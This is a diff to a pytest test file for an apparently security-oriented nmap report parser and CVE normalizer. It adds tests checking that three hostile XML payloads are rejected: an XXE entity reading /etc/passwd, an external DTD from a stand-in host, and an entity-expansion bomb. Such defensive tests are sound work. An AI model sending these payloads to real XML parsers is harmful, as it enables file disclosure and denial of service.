@@ -1,8 +1,8 @@
 import pytest
 
+from app.intel.provider import IntelProvider
 from app.parsers import ParseError, parse_report
 from app.schemas import HostIn, ServiceIn, VulnerabilityIn
-from app.services.intel import get_intel
 from app.services.normalizer import build_findings
 
 
@@ -52,10 +52,10 @@ def _host(**kw):
 
 def test_service_version_maps_to_cves_via_catalog():
     host = _host(services=[ServiceIn(port=80, name="http", product="Apache httpd", version="2.4.49")])
-    services, findings = build_findings(host, "nmap", get_intel())
+    services, findings = build_findings(host, "nmap", IntelProvider(None))
     assert {f.cve_id for f in findings} == {"CVE-2021-41773", "CVE-2021-42013"}
     f = next(f for f in findings if f.cve_id == "CVE-2021-41773")
-    assert f.in_kev and f.risk_score == 10.0 and "rce" in f.tags and f.sources == ["catalog"]
+    assert f.in_kev and "rce" in f.tags and f.sources == ["catalog"] and f.evidence_status == "inferred"
     assert services[0].cpe.startswith("cpe:2.3:a:apache:http_server:2.4.49")  # vendor name normalized
 
 
@@ -66,7 +66,7 @@ def test_scanner_and_catalog_findings_dedupe_within_a_host():
             VulnerabilityIn(cve_id="cve-2021-41773", title="Apache bug", port=80, protocol="tcp", cvss_score=7.5)
         ],
     )
-    _, findings = build_findings(host, "nmap", get_intel())
+    _, findings = build_findings(host, "nmap", IntelProvider(None))
     [f] = [f for f in findings if f.cve_id == "CVE-2021-41773"]
     assert f.sources == ["catalog", "nmap"] and set(f.evidence) == {"catalog", "nmap"}
 
@@ -75,7 +75,7 @@ def test_cvss_from_label_cve_from_title_and_tag_inference():
     host = _host(
         vulnerabilities=[VulnerabilityIn(title="Foo allows Remote Code Execution (CVE-2099-0001)", severity="High")]
     )
-    _, [f] = build_findings(host, "x", get_intel())
+    _, [f] = build_findings(host, "x", IntelProvider(None))
     assert f.cve_id == "CVE-2099-0001" and f.cvss_score == 8.0 and f.severity == "high" and f.tags == ["rce"]
 
 
@@ -84,7 +84,7 @@ def test_finding_inherits_service_details():
         services=[ServiceIn(port=22, name="ssh", product="OpenSSH", version="7.2p2")],
         vulnerabilities=[VulnerabilityIn(title="weak kex", port=22)],
     )
-    _, findings = build_findings(host, "x", get_intel())
+    _, findings = build_findings(host, "x", IntelProvider(None))
     weak = next(f for f in findings if f.title == "weak kex")
     assert (weak.product, weak.version, weak.service_name) == ("OpenSSH", "7.2p2", "ssh")
     assert any(f.cve_id == "CVE-2018-15473" for f in findings)  # OpenSSH < 7.7
@@ -92,5 +92,25 @@ def test_finding_inherits_service_details():
 
 def test_generic_scanner_title_is_replaced_by_catalog_title():
     host = _host(vulnerabilities=[VulnerabilityIn(cve_id="CVE-2021-4034", title="CVE-2021-4034 on polkit", port=None)])
-    _, [f] = build_findings(host, "nmap", get_intel())
+    _, [f] = build_findings(host, "nmap", IntelProvider(None))
     assert "PwnKit" in f.title
+
+
+def test_real_nmap_header_with_bare_doctype_is_accepted(nmap_xml):
+    # genuine `nmap -oX` files begin with <!DOCTYPE nmaprun> and an xml-stylesheet PI
+    assert "<!DOCTYPE nmaprun>" in nmap_xml and "xml-stylesheet" in nmap_xml
+    assert len(parse_report("nmap", nmap_xml).hosts) == 2
+
+
+@pytest.mark.parametrize(
+    "evil",
+    [
+        '<?xml version="1.0"?><!DOCTYPE nmaprun [<!ENTITY a SYSTEM "file:///etc/passwd">]><nmaprun>&a;</nmaprun>',
+        '<?xml version="1.0"?><!DOCTYPE nmaprun SYSTEM "http://evil.example/x.dtd"><nmaprun/>',
+        '<?xml version="1.0"?><!DOCTYPE nmaprun [<!ENTITY a "aaaa"><!ENTITY b "&a;&a;&a;">]><nmaprun>&b;</nmaprun>',
+    ],
+    ids=["xxe-file", "external-dtd", "entity-expansion"],
+)
+def test_dangerous_doctypes_still_rejected(evil):
+    with pytest.raises(ParseError, match="unsafe XML"):
+        parse_report("nmap", evil)
